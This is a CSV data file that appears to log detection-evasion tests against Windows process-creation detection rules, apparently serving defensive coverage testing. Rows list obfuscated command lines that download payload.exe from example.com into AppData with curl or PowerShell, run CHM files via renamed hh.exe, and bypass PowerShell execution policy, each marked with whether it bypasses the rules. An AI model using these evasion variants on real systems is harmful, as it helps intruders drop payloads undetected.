Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -ComMAnd ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -COMmANd ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe /""Command"" ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -COmmANd ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -COMmAND ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_path_traversal,Potential CommandLine Path Traversal Via Cmd.EXE,087790e3-3287-436c-bccf-cbd0184a7db1,,"cmd.exe /c ""..\..\Windows\System32\calc.exe""",TRUE,TRUE,FALSE,Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b); Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b)
t1059.003,proc_creation_win_cmd_path_traversal,Potential CommandLine Path Traversal Via Cmd.EXE,087790e3-3287-436c-bccf-cbd0184a7db1,,"cmd.exe /C ""..\..\Windows\System32\calc.exe""",TRUE,TRUE,FALSE,Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b); Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b)
t1059.003,proc_creation_win_hh_susp_execution,Suspicious HH.EXE Execution,e8a95b5e-c891-46e2-b33a-93937d3abc31,,"cmd.exe /c ""cd C:\Users\Public\Downloads && hh.exe payload.chm""",TRUE,TRUE,FALSE,HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
t1059.003,proc_creation_win_hh_susp_execution,Suspicious HH.EXE Execution,e8a95b5e-c891-46e2-b33a-93937d3abc31,,"cmd.exe /c ""copy C:\Windows\hh.exe C:\ProgramData\not_hh.exe && C:\ProgramData\not_hh.exe C:\Users\%USERNAME%\Documents\payload.chm""",TRUE,TRUE,FALSE,HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
t1059.003,proc_creation_win_hh_susp_execution,Suspicious HH.EXE Execution,e8a95b5e-c891-46e2-b33a-93937d3abc31,,"cmd.exe /c ""cd %USERPROFILE%\Downloads && hh.exe payload.chm""",TRUE,TRUE,FALSE,HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_modules,Operator Bloopers Cobalt Strike Modules,4f154fb6-27d1-4813-a759-78b93e0b9c48,,"cmd.exe /c ""set a=Invoke-&set b=UserHunter&call powershell -c %a%%b%""",TRUE,TRUE,FALSE,Malicious PowerShell Commandlets - ProcessCreation (02030f2f-6199-49ec-b258-ea71b07e03dc)
t1059.003,proc_creation_win_hktl_crackmapexec_execution_patterns,HackTool - CrackMapExec Execution Patterns,058f4380-962d-40a5-afce-50207d36d7e2,,"powershell.exe -nOp -noNi /""w"" 1 -ExeC bypass -c ""Write-Host 'Test'""",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1059.003,proc_creation_win_hktl_crackmapexec_execution_patterns,HackTool - CrackMapExec Execution Patterns,058f4380-962d-40a5-afce-50207d36d7e2,,"powershell.exe -""nop"" -noni -w 1 /""exec"" bypass /""c"" ""Write-Host 'Test'""",TRUE,TRUE,TRUE,
t1059.003,proc_creation_win_hktl_crackmapexec_execution_patterns,HackTool - CrackMapExec Execution Patterns,058f4380-962d-40a5-afce-50207d36d7e2,,"powershell.exe -NoProfile -noni -W 1 /""exec"" bypass -Command ""Write-Host 'Test'""",TRUE,TRUE,TRUE,
t1059.003,proc_creation_win_hktl_crackmapexec_execution_patterns,HackTool - CrackMapExec Execution Patterns,058f4380-962d-40a5-afce-50207d36d7e2,,"powershell.exe -NoProfile -noNI /""w"" 1 /""exec"" bypass /""c"" ""Write-Host 'Test'""",TRUE,TRUE,TRUE,
t1059.003,proc_creation_win_hktl_crackmapexec_execution_patterns,HackTool - CrackMapExec Execution Patterns,058f4380-962d-40a5-afce-50207d36d7e2,,"powershell.exe -""nop"" -noni -w 1 -exEC bypass -Command ""Write-Host 'Test'""",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1059.003,proc_creation_win_hktl_crackmapexec_execution_patterns,HackTool - CrackMapExec Execution Patterns,058f4380-962d-40a5-afce-50207d36d7e2,,"powershell.exe /""nop"" -noni -w 1 -eXeC bypass -Command ""Write-Host 'Test'""",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1059.003,proc_creation_win_hktl_crackmapexec_execution_patterns,HackTool - CrackMapExec Execution Patterns,058f4380-962d-40a5-afce-50207d36d7e2,,"powershell.exe /""nop"" /""noni"" -w 1 -exec bypass -Command ""Write-Host 'Test'""",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1059.003,proc_creation_win_hktl_koadic,HackTool - Koadic Execution,5cddf373-ef00-4112-ad72-960ac29bac34,,"cmd.exe /q /c ""ch""""cp"" 1252",TRUE,TRUE,TRUE,
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -""Command"" ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe /""Command"" ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%""",TRUE,TRUE,FALSE,Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%""",TRUE,TRUE,FALSE,Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe /""Command"" ""Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl http://example.com/payload.exe -o %USERPROFILE%\AppData\Roaming\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl http://example.com/payload.exe -o %USERPROFILE%\AppData\Roaming\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl http://example.local/test.txt -o C:\Users\Public\AppData\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl http://example.local/test.txt -o C:\Users\Public\AppData\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""set A=App&& set D=Data&& cmd /c curl h^ttp://example.local/test.txt -o %USERPROFILE%\%A%%D%\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /V:ON /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /V:oN /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /v:on /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /""V:ON"" /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /v:ON /C ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -Command ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile ""$env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -ComMAnd ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -COMmANd ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe /""Command"" ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -c ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -COmmANd ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -COMmAND ""Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile "" $env:APPDATA\payload.exe""""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_vscode_tunnel_renamed_execution,Renamed Visual Studio Code Tunnel Execution,2cf29f11-e356-4f61-98c0-1bdb9393d6da,,"""C:\Windows\System32\cmd.exe"" /c ""notepad.exe""",TRUE,TRUE,TRUE,
t1564.003,proc_creation_win_browsers_chromium_headless_exec,Browser Execution In Headless Mode,ef9dcfed-690c-4c5d-a9d1-482cd422225c,,wmic useraccount where name='guest' set passwordexpires=0,TRUE,TRUE,TRUE,
t1564.003,proc_creation_win_browsers_chromium_headless_exec,Browser Execution In Headless Mode,ef9dcfed-690c-4c5d-a9d1-482cd422225c,,wmic path Win32_UserAccount where name='guest' set passwordexpires=false,TRUE,TRUE,FALSE,Password Set to Never Expire via WMI (7864a175-3654-4824-9f0d-f0da18ab27c0)
